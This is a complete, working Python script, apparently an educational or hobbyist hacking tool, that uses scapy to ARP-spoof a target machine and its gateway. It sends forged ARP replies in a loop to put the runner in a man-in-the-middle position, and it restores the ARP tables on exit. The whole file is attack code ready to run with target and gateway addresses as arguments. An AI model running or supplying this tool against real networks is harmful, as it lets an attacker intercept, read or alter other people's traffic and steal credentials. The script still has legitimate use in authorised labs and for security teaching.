#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP address")
    parser.add_argument("-s", "--spoofed", dest="spoofed_ip", help="Spoofed IP address (gateway)")
    options = parser.parse_args()

    if not options.target_ip:
        parser.error("[-] Please specify a target IP, use --help for more info.")
    if not options.spoofed_ip:
        parser.error("[-] Please specify a spoofed IP, use --help for more info.")

    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    request_broadcast = broadcast / arp_request

    answered = scapy.srp(request_broadcast, timeout=2, verbose=False)[0]

    if answered:
        return answered[0][1].hwsrc
    return None


def spoof(target_ip, spoofed_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[-] Could not find MAC for {target_ip}")
        return

    packet = scapy.Ether(dst=target_mac) / scapy.ARP(
        op=2,
        pdst=target_ip,
        psrc=spoofed_ip,
        hwdst=target_mac
    )
    scapy.sendp(packet, verbose=False)


def restore(destination_ip, source_ip):
    dest_mac = get_mac(destination_ip)
    src_mac = get_mac(source_ip)

    if dest_mac is None or src_mac is None:
        print("[-] Failed to restore ARP table (MAC not found)")
        return

    packet = scapy.Ether(dst=dest_mac) / scapy.ARP(
        op=2,
        pdst=destination_ip,
        psrc=source_ip,
        hwsrc=src_mac,
        hwdst=dest_mac
    )

    scapy.sendp(packet, count=4, verbose=False)


options = get_arguments()
sent_packets = 0

try:
    while True:
        spoof(options.target_ip, options.spoofed_ip)
        spoof(options.spoofed_ip, options.target_ip)

        sent_packets += 2
        print(f"\r[+] Packets sent: {sent_packets}", end="")

        time.sleep(2)

except KeyboardInterrupt:
    print("\n[!] Detected CTRL + C ... Restoring ARP tables...")

    restore(options.target_ip, options.spoofed_ip)
    restore(options.spoofed_ip, options.target_ip)

    print("[+] Done.")